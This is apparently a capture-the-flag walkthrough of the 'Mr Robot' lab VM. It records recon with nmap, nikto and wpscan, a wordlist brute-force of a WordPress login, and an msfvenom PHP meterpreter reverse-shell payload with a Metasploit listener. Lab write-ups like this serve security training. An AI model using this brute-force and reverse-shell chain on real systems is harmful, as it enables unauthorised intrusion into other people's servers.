<h1>Mr Robot CTF</h1>

netdiscover -i eth1
  IP            At MAC Address     Count     Len  MAC Vendor / Hostname
  -----------------------------------------------------------------------------
  192.168.8.1     0a:5b:8f:27:9a:64     49    2058  Unknown vendor
  192.168.8.101   08:00:27:38:c0:04     33    1386  PCS Systemtechnik GmbH
  192.168.8.1     ba:ab:be:34:00:00   1018   42756  Unknown vendor

nmap -sS -sV -Pn -A -v 192.168.56.101 -oX mrrobot.xml
  Nmap scan report for 192.168.8.101
  Host is up (0.000036s latency).
  Not shown: 997 filtered ports
  PORT    STATE  SERVICE
  22/tcp  closed ssh
  80/tcp  open   http
  443/tcp open   https
  MAC Address: 08:00:27:38:C0:04 (Oracle VirtualBox virtual NIC)

<h2>Enum</h2>
  address        mac                name  os_name  os_flavor  os_sp  purpose  info  comments
  -------        ---                ----  -------  ---------  -----  -------  ----  --------
  192.168.8.101  08:00:27:38:c0:04        Linux               3.X    server

  host           port  proto  name      state   info
  ----           ----  -----  ----      -----   ----
  192.168.8.101  22    tcp    ssh       closed
  192.168.8.101  80    tcp    http      open    Apache httpd
  192.168.8.101  443   tcp    ssl/http  open    Apache httpd

<h2>Website Hacking</h2>
  http 192.168.8.101
    HTTP/1.1 200 OK
    Accept-Ranges: bytes
    Cache-Control: max-age=0, no-cache
    Connection: Keep-Alive
    Content-Encoding: gzip
    Content-Length: 614
    Content-Type: text/html
    Date: Mon, 23 Oct 2017 13:34:30 GMT
    Keep-Alive: timeout=5, max=100
    Server: Apache
    Vary: Accept-Encoding
    X-Frame-Options: SAMEORIGIN
    X-Mod-Pagespeed: 1.9.32.3-4523

  http://192.168.8.101/robots.txt
    User-agent: *
    fsocity.dic
    key-1-of-3.txt

  http://192.168.8.101/fsocity.dic
    File looks like a 15000 lines dic file
      > Save for later

  http://192.168.8.101/key-1-of-3.txt
    First flag: 073403c8a58a1f80d943455fb30724b9

<h2>Fsocity.dic</h2>
  $ file fsocity.dic
  fsocity.dic: ASCII text, with very long lines

  $ sort fsocity.dic | uniq | wc -l
  11451

<h2>Nikto</h2>
  nikto -h 192.168.8.101
  - Nikto v2.1.6
  ---------------------------------------------------------------------------
  + Target IP:          192.168.8.101
  + Target Hostname:    192.168.8.101
  + Target Port:        80
  + Start Time:         2017-10-23 15:10:29 (GMT2)
  ---------------------------------------------------------------------------
  + Server: Apache
  + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
  + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
  + Retrieved x-powered-by header: PHP/5.5.29
  + No CGI Directories found (use '-C all' to force check all possible dirs)
  + Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x29 0x52467010ef8ad
  + Uncommon header 'tcn' found, with contents: list
  + Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php
  + OSVDB-3092: /admin/: This might be interesting...
  + OSVDB-3092: /readme: This might be interesting...
  + Uncommon header 'link' found, with contents: <http://192.168.8.101/?p=23>
  + /readme.html: This WordPress file reveals the installed version.
  + /wp-links-opml.php: This WordPress script reveals the installed version.
  + OSVDB-3092: /license.txt: License file found may identify site software.
  + /admin/index.html: Admin login page/section found.
  + Cookie wordpress_test_cookie created without the httponly flag
  + /wp-login/: Admin login page/section found.
  + /wordpress/: A Wordpress installation was found.
  + /wp-admin/wp-login.php: Wordpress login found
  + /blog/wp-login.php: Wordpress login found
  + /wp-login.php: Wordpress login found


<h2>Wpscan</h2>
  [+] robots.txt available under: 'http://192.168.8.101/robots.txt'
  [+] Interesting header: SERVER: Apache
  [+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
  [+] Interesting header: X-MOD-PAGESPEED: 1.9.32.3-4523
  [+] XML-RPC Interface available under: http://192.168.8.101/xmlrpc.php

  [+] WordPress version 4.3.1 (Released on 2015-09-15) identified from advanced
  fingerprinting, rss generator, rdf generator, atom generator, links opml
  [!] 39 vulnerabilities identified from the version number

<h2>Login</h2>
  http://192.168.8.101/wp-login
  admin:admin
    ERROR: Invalid username. Lost your password?
  elliot:elliot
    ERROR: The password you entered for the username elliot is incorrect.

  User: elliot
  Fixing dic file into something useful
   cat fsocity.dic| sort -u | uniq > Newfsocity.dic

   <h3>Bruteforcing with wpscan</h3>
      wpscan --url 192.168.8.101 --wordlist /home/e/Downloads/Newfsocity.dic --username elliot
      +----+--------+------+-----------+
      | Id | Login  | Name | Password  |
      +----+--------+------+-----------+
      |    | elliot |      | ER28-0652 |
      +----+--------+------+-----------+

<h2>Shell</h2>

  use exploit/unix/webapp/wp_admin_shell_upload

  msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.8.100 LPORT=4444 -f raw -o meterpreter.php

use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.8.100
set LPORT 4444
set ExitOnSession false
exploit -j -z
